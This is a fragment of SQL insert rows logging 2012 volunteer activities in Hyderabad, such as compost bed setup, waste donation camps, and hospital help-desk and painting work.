(275, '120', '2012-05-17', '2012-05-17', '14:15:00', '14:00:00', '1', 'Shram daan', 'Environment', 'Setting a waste donation camp at ca technologies (Gachibowli).', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(276, '120', '2012-05-17', '2012-05-17', '16:00:00', '18:00:00', '2', 'Gyaan daan', 'Environment', 'Training the workers on how to maintain the compost.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(277, '120', '2012-05-18', '2012-05-18', '10:00:00', '12:30:00', '2', 'Shram daan', 'Environment', 'Updating the intern SIP database.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(278, '120', '2012-05-19', '2012-05-19', '09:30:00', '11:30:00', '2', 'Shram daan', 'Environment', 'Weekly checking and traning the HMDA workers maintaining (NTR & Lumbinipark) compost centre.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(279, '120', '2012-05-19', '2012-05-19', '12:00:00', '14:00:00', '2', 'Shram daan', 'Environment', 'Installing a Compost beds at HMDA NTR Garden.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(280, '120', '2012-05-19', '2012-05-19', '14:00:00', '17:00:00', '3', 'Gyaan daan', 'Environment', ' Training and The HMDA workers on building Compost Bed.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(281, '120', '2012-05-20', '2012-05-20', '10:30:00', '12:30:00', '2', 'Gyaan daan', 'Environment', 'Traning the HMDA workers maintaining (NTR & Lumbinipark) compost centre.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(282, '120', '2012-05-20', '2012-05-20', '13:00:00', '14:30:00', '1', 'Gyaan daan', 'Environment', 'Installing Compost beds at HMDA NTR Garden.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(283, '120', '2012-05-20', '2012-05-20', '14:30:00', '15:30:00', '1', 'Gyaan daan', 'Environment', 'Training and The HMDA workers on building Compost Bed at NTR garden.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(284, '120', '2012-05-21', '2012-05-21', '09:30:00', '10:30:00', '1', 'Shram daan', 'Environment', 'Buying a rake for NTR park compost beds(HMDA).', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(285, '120', '2012-05-21', '2012-05-21', '11:00:00', '12:00:00', '1', 'Shram daan', 'Environment', 'Installing compost bed at Lumbini Park(HMDA).', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(286, '120', '2012-05-21', '2012-05-21', '12:30:00', '13:30:00', '1', 'Gyaan daan', 'Environment', 'Traing the worker of lumbini park on how to install a compost bed(HMDA).', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(287, '120', '2012-05-21', '2012-05-21', '14:30:00', '15:30:00', '1', 'Gyaan daan', 'Environment', 'Traing the worker of lumbini park on how to install a compost bed(HMDA).', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(288, '120', '2012-05-21', '2012-05-21', '16:00:00', '17:00:00', '1', 'Gyaan daan', 'Environment', 'Explaining NTR Park garden team on how to maintain the organic wet waste in the newly installed compost beds.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(289, '120', '2012-05-22', '2012-05-22', '09:30:00', '10:30:00', '1', 'Shram daan', 'Environment', 'Selling the E-waste to Earth sense(Ameerpet)', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(290, '120', '2012-05-22', '2012-05-22', '11:30:00', '12:30:00', '1', 'Shram daan', 'Environment', 'Printing signages for Hill Ridge Springs compost bed.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(291, '120', '2012-05-22', '2012-05-22', '13:30:00', '14:30:00', '1', 'Shram daan', 'Environment', 'Depositing cheque and amount from selling E-waste in the bank.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(292, '120', '2012-05-22', '2012-05-22', '15:00:00', '16:00:00', '1', 'Shram daan', 'Environment', 'Training NTR-garden, workers maintaining the compost.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(293, '120', '2012-05-22', '2012-05-22', '16:30:00', '17:30:00', '1', 'Shram daan', 'Environment', 'Survey of Plastic cover needed for covering the Compost Beds.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(294, '120', '2012-05-22', '2012-05-22', '18:00:00', '19:00:00', '1', 'Gyaan daan', 'Environment', 'Training the Workers on how to maintain the compost in the compost bed.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(295, '120', '2012-05-22', '2012-05-22', '19:00:00', '20:00:00', '1', 'Shram daan', 'Environment', 'Survey of item neeed for the compost bed.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(296, '120', '2012-05-23', '2012-05-23', '14:00:00', '15:00:00', '1', 'Shram daan', 'Environment', 'Training the NTR Garden staff on maintaining the compost.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(297, '120', '2012-05-23', '2012-05-23', '15:30:00', '16:40:00', '1', 'Gyaan daan', 'Environment', 'Meeting with NTR garden supervisor,explaining how to maintain the compost food waste.Training the NTR Garden staff on maintaining the compost.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(298, '120', '2012-05-23', '2012-05-23', '16:45:00', '17:30:00', '1', 'Shram daan', 'Environment', 'Ordering poster for the compost bed. 5. Updating the Intern report.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(299, '139', '2012-04-25', '2012-04-25', '18:30:00', '19:30:00', '1', 'Shram Daan', 'Environment', 'Design of waste donation posters', 'Offsite', 'Hyderabad', '', 'ABS', 7),
(300, '157', '2012-04-26', '2012-04-27', '00:00:00', '00:00:00', '6', 'Shram Daan', 'Environment', 'Design of waste donation posters', 'Offsite', 'Hyderabad', '', 'Innogarage', 7),
(301, '158', '2012-04-28', '2012-04-28', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Padmarao Nagar', 'Onsite', 'Hyderabad', '', 'TFI', 7),
(302, '159', '2012-04-28', '2012-04-28', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Padmarao Nagar', 'Onsite', 'Hyderabad', '', 'TFI', 7),
(303, '114', '2012-04-28', '2012-04-28', '14:00:00', '16:00:00', '2', 'Shram Daan', 'Environment', 'Procument of Waste collection bags from Begum Bazaar', 'Offsite', 'Hyderabad', '', 'ABS', 7),
(304, '114', '2012-04-29', '2012-04-29', '10:00:00', '16:00:00', '6', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Hills Ridge Springs', 'Onsite', 'Hyderabad', '', 'ABS', 7),
(305, '100', '2012-04-29', '2012-04-29', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Hills Ridge Springs', 'Onsite', 'Hyderabad', '', '', 7),
(306, '160', '2012-04-29', '2012-04-29', '10:00:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Hills Ridge Springs', 'Onsite', 'Hyderabad', '', '', 7),
(307, '161', '2012-04-29', '2012-04-29', '10:00:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Trendset towers', 'Onsite', 'Hyderabad', '', '', 7),
(308, '82', '2012-04-29', '2012-04-29', '10:00:00', '16:00:00', '6', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Trendset towers', 'Onsite', 'Hyderabad', '', 'ABS', 7),
(309, '115', '2012-04-29', '2012-04-29', '10:00:00', '16:00:00', '6', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Serene county', 'Onsite', 'Hyderabad', '', 'ABS', 7),
(310, '114', '2012-05-27', '2012-05-27', '10:00:00', '16:00:00', '6', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Hills Ridge Springs', 'Onsite', 'Hyderabad', '', 'ABS', 7),
(311, '100', '2012-05-27', '2012-05-27', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Hills Ridge Springs', 'Onsite', 'Hyderabad', '', '', 7),
(312, '158', '2012-04-20', '2012-04-20', '13:00:00', '15:00:00', '2', 'Shram Daan', 'Environment', 'Setting up of compost centers at Lumbini Park', 'Onsite', 'Hyderabad', '', 'TFI', 7),
(313, '159', '2012-04-20', '2012-04-20', '13:00:00', '15:00:00', '2', 'Shram Daan', 'Environment', 'Setting up of compost centers at Lumbini Park', 'Onsite', 'Hyderabad', '', 'TFI', 7),
(314, '158', '2012-04-26', '2012-04-26', '13:00:00', '15:00:00', '2', 'Shram Daan', 'Environment', 'Setting up of compost centers at HillRidge Springs', 'Onsite', 'Hyderabad', '', 'TFI', 7),
(315, '159', '2012-04-26', '2012-04-26', '13:00:00', '15:00:00', '2', 'Shram Daan', 'Environment', 'Setting up of compost centers at HillRidge Springs', 'Onsite', 'Hyderabad', '', 'TFI', 7),
(316, '158', '2012-04-27', '2012-04-27', '00:00:00', '00:00:00', '2', 'Shram Daan', 'Environment', 'Preparation of presentation on How to setup compost centers', 'Offsite', 'Hyderabad', '', 'TFI', 7),
(317, '159', '2012-04-27', '2012-04-27', '00:00:00', '00:00:00', '2', 'Shram Daan', 'Environment', 'Preparation of presentation on How to setup compost centers', 'Offsite', 'Hyderabad', '', 'TFI', 7),
(318, '164', '2012-06-11', '2012-06-11', '12:00:00', '16:00:00', '4', 'Shram Daan', 'IT', 'Server trouble shooting for Gandhi Hospital', 'Onsite', 'Hyderabad', 'BASIX', NULL, 12),
(319, '84', '2012-05-22', '2012-05-22', '11:00:00', '14:00:00', '3', 'Shram Daan', 'Environment', 'Went to Ranigunj Area to buy Plastic Tarapulin ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(320, '84', '2012-05-23', '2012-05-23', '11:00:00', '12:00:00', '1', 'Shram Daan', 'Environment', 'visit compost center at HMDA office and NTR Garden', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(321, '84', '2012-05-25', '2012-05-25', '12:00:00', '16:00:00', '4', 'Shram Daan\n', 'Environment', 'Went to Ameerpet,Lakdikapool and Chikkadply area to find Floop Board Poster', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(322, '84', '2012-05-26', '2012-05-26', '16:00:00', '18:00:00', '2', 'Shram Daan\n', 'Environment', 'Prepare Camp kit for Next day Waste Donation Camp at Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(323, '84', '2012-05-27', '2012-05-27', '09:00:00', '15:00:00', '6', 'Shram Daan\n', 'Environment', 'Participate in Waste Doantion camp at Gachibowli in different places', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(324, '84', '2012-05-28', '2012-05-28', '11:00:00', '14:00:00', '3', 'Shram Daan\n', 'Health', 'Went to Gandhi Hospital to attend the Meeting with Dr. Abhijeet', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(325, '84', '2012-05-28', '2012-05-28', '16:00:00', '17:00:00', '1', 'Shram Daan\n', 'Environment', 'Prepare Waste Donation Back up data for You See online upload', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(326, '84', '2012-05-29', '2012-05-29', '13:00:00', '14:00:00', '1', 'Shram Daan\n', 'Environment', 'Prepare Waste Doantion Camp Final Data for online update', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(327, '84', '2012-05-29', '2012-05-29', '16:00:00', '18:00:00', '2', 'Shram Daan\n', 'Environment', 'Went for find out Signages suppliers for C garden', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(328, '84', '2012-05-30', '2012-05-30', '10:00:00', '11:30:00', '1', 'Shram Daan\n', 'Environment', 'Gave E- waste to Earthsense', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(329, '84', '2012-05-30', '2012-05-30', '12:00:00', '14:00:00', '2', 'Shram Daan\n', 'Environment', 'Went to NTR Garden and HMDA office compost center', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(330, '84', '2012-05-30', '2012-05-30', '15:00:00', '17:00:00', '2', 'Shram Daan\n', 'Health', 'Went to Gandhi Hospital to help santosh and Rinku at regular You See activity at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(331, '84', '2012-06-02', '2012-06-02', '11:00:00', '13:00:00', '2', 'Shram Daan\n', 'Environment', 'Went to R.P. Road to find the Plastic Drum for Compost Centers', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(332, '84', '2012-06-02', '2012-06-02', '14:00:00', '16:00:00', '2', 'Shram Daan\n', 'Environment', 'Went to Erragada area to buy seeds and Compost tools', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(333, '84', '2012-06-03', '2012-06-03', '10:00:00', '14:00:00', '4', 'Shram Daan\n', 'Environment', 'Went to Lamakaan to organise Waste Donation camp ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(334, '84', '2012-06-04', '2012-06-04', '11:00:00', '15:00:00', '4', 'Shram Daan\n', 'Environment', 'Went to Ramkot to buy Floop and Foam Board and its tools for signages and Poster', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(335, '84', '2012-06-06', '2012-06-06', '11:00:00', '15:00:00', '4', 'Shram Daan\n', 'Environment', 'Went to find differnet kinds of Plastic drum for Compost beds', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(336, '84', '2012-06-07', '2012-06-07', '11:00:00', '12:00:00', '1', 'Shram Daan\n', 'Environment', 'Went to HMDA office and NTR garden to monitor compost  Center', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(337, '84', '2012-06-07', '2012-06-07', '14:00:00', '16:00:00', '2', 'Shram Daan\n', 'Health', 'Paint the cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(338, '84', '2012-06-08', '2012-06-08', '11:00:00', '12:00:00', '1', 'Shram Daan\n', 'Environment', 'Went to HMDA office and NTR garden to monitor compost  Center', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(339, '84', '2012-06-08', '2012-06-08', '14:00:00', '17:00:00', '3', 'Shram Daan\n', 'Environment', 'Went to Invesco office to collect Waste Donation amount and while coming purchased Red Soil', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(340, '84', '2012-06-10', '2012-06-10', '11:00:00', '13:00:00', '2', 'Shram Daan\n', 'Environment', 'Make a PPT for  Overall Compost center work and its output', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(341, '84', '2012-06-11', '2012-06-11', '11:30:00', '15:00:00', '3', 'Shram Daan\n', 'Environment', 'Went to Ranigunj to buy compost material', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(342, '84', '2012-06-12', '2012-06-12', '10:00:00', '12:00:00', '2', 'Shram Daan\n', 'Environment', 'Give the composting orientation programme to Aurora Degree College students and visit with them HMDA and NTR Garden Compost center', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(343, '84', '2012-06-12', '2012-06-12', '14:00:00', '16:00:00', '2', 'Shram Daan\n', 'Environment', 'went to Hills Ridges Springs to handover the Compost mixing Rake to garden team', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(344, '84', '2012-06-13', '2012-06-13', '14:00:00', '18:00:00', '3', 'Shram Daan\n', 'Environment', 'Work on to set up Compost Beds at You See Place', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(345, '84', '2012-06-14', '2012-06-14', '13:00:00', '17:00:00', '3', 'Shram Daan\n', 'Environment', 'Set up Compost Bed at You See office', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(346, '84', '2012-06-15', '2012-06-15', '13:00:00', '14:00:00', '1', 'Shram Daan\n', 'Environment', 'went to HDFC Bank to Deposit You See`s Check and Cash', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(347, '84', '2012-06-15', '2012-06-15', '14:30:00', '15:30:00', '1', 'Shram Daan\n', 'Environment', 'Mix the compost beds at You See place', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(348, '84', '2012-06-16', '2012-06-16', '11:00:00', '12:00:00', '1', 'Shram Daan\n', 'Environment', 'Mix the compost beds at You See place', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(349, '84', '2012-06-16', '2012-06-16', '12:30:00', '13:30:00', '1', 'Shram Daan\n', 'Environment', 'Went to Ameerpet to buy Bamboo Mats for cover the Compost Beds', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(350, '84', '2012-06-16', '2012-06-16', '15:00:00', '18:00:00', '2', 'Shram Daan\n', 'Environment', 'Went to Ranigunj area to Buy Tarapulin for Cover Compost Beds', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(351, '84', '2012-06-17', '2012-06-17', '10:30:00', '11:30:00', '1', 'Shram Daan\n', 'Environment', 'Went to Hills Ridges Springs to Monitor Compost Center .', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(352, '169', '2012-06-20', '2012-06-20', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Setting up of 2 compost beds at NTR park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(353, '170', '2012-06-20', '2012-06-20', '09:30:00', '15:00:00', '5', 'Shram Daan', 'Environment', 'Setting up of 2 compost beds at NTR park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(354, '171', '2012-06-20', '2012-06-20', '09:30:00', '15:00:00', '5', 'Shram Daan', 'Environment', 'Setting up of 2 compost beds at NTR park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(355, '172', '2012-06-20', '2012-06-20', '09:30:00', '15:00:00', '5', 'Shram Daan', 'Environment', 'Setting up of 2 compost beds at NTR park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(356, '173', '2012-06-20', '2012-06-20', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Setting up of 2 compost beds at NTR park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(357, '168', '2012-06-21', '2012-06-21', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Setting up of 1 compost beds at NTR park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(358, '169', '2012-06-21', '2012-06-21', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Setting up of 1 compost beds at NTR park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(359, '179', '2012-06-21', '2012-06-21', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Setting up of 1 compost beds at NTR park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(360, '182', '2012-06-21', '2012-06-21', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Setting up of 1 compost beds at NTR park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(361, '180', '2012-06-21', '2012-06-21', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Setting up of 1 compost beds at NTR park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(362, '173', '2012-06-21', '2012-06-21', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Setting up of 1 compost beds at NTR park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(363, '174', '2012-06-21', '2012-06-21', '13:00:00', '18:00:00', '4', 'Shram Daan', 'Environment', 'Setting up of 1 compost beds at Aurora', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(364, '169', '2012-06-22', '2012-06-22', '13:00:00', '18:00:00', '4', 'Shram Daan', 'Environment', 'Setting up of 1 compost beds at Aurora', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(365, '176', '2012-06-22', '2012-06-22', '13:00:00', '18:00:00', '4', 'Shram Daan', 'Environment', 'Setting up of 1 compost beds at Aurora', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(366, '221', '2012-06-22', '2012-06-22', '13:00:00', '18:00:00', '4', 'Shram Daan', 'Environment', 'Setting up of 1 compost beds at Aurora', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(367, '170', '2012-06-22', '2012-06-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(368, '203', '2012-06-22', '2012-06-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(369, '204', '2012-06-22', '2012-06-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(370, '171', '2012-06-22', '2012-06-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(371, '170', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(372, '203', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(373, '204', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(374, '171', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(375, '169', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(376, '178', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(377, '176', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(378, '175', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(379, '183', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(380, '174', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supervising sanitation activities at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(381, '181', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supervising sanitation activities at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(382, '177', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(383, '179', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(384, '180', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(385, '173', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(386, '182', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(387, '187', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(388, '185', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(389, '186', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(390, '184', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(391, '192', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(392, '191', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(393, '193', '2012-06-23', '2012-06-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(394, '179', '2012-06-26', '2012-06-26', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(395, '180', '2012-06-26', '2012-06-26', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(396, '173', '2012-06-26', '2012-06-26', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(397, '182', '2012-06-26', '2012-06-26', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(398, '171', '2012-06-26', '2012-06-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(399, '170', '2012-06-26', '2012-06-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(400, '188', '2012-06-26', '2012-06-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(401, '189', '2012-06-26', '2012-06-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(402, '190', '2012-06-26', '2012-06-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(403, '184', '2012-06-26', '2012-06-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(404, '185', '2012-06-26', '2012-06-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(405, '183', '2012-06-26', '2012-06-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(406, '187', '2012-06-26', '2012-06-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(407, '185', '2012-06-28', '2012-06-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(408, '196', '2012-06-28', '2012-06-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(409, '194', '2012-06-28', '2012-06-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(410, '197', '2012-06-28', '2012-06-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(411, '195', '2012-06-28', '2012-06-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(412, '179', '2012-06-28', '2012-06-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(413, '180', '2012-06-28', '2012-06-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(414, '173', '2012-06-28', '2012-06-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(415, '182', '2012-06-28', '2012-06-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(416, '174', '2012-06-29', '2012-06-29', '10:00:00', '13:00:00', '2', 'Shram Daan', 'Education', 'Conducting Book Donation camp at ADC', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(417, '178', '2012-06-29', '2012-06-29', '10:00:00', '13:00:00', '2', 'Shram Daan', 'Education', 'Conducting Book Donation camp at ADC', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(418, '221', '2012-06-29', '2012-06-29', '10:00:00', '13:00:00', '2', 'Shram Daan', 'Education', 'Conducting Book Donation camp at ADC', 'Onsite', 'Hyderabad', 'ADC', '', 7),
